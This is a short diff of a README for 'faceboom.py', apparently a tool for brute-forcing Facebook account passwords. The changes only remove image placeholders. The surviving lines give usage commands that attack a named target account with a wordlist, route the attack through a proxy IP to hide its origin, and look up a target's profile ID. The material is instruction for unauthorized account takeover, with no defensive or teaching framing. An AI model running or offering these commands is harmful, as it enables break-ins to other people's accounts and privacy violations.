@@ -7,26 +7,26 @@
 
     - **Usage**:
     
-      ![Options]
+     
 
 
     - **Brute Force On Facebook Account Without proxy**:
      
      * **Command**: python faceboom.py -t anonymousvai345@gmail.com -w wlist.txt
      
-         ![withoutProxy]
+         
    
    - **Brute Force On Facebook Account With Proxy**:
    
     * **Command**: python faceboom.py -t anonymousvai345@gmail.com -w wlist.txt -p 144.217.101.245:3129
     
-         ![withProxy]
+         
 
    - **Get Target Facebook Profile ID**:
    
     * **Command**: python faceboom.py -g https://www.facebook.com/crackervai/
     
-         ![getID]
+         
 
 ***
 
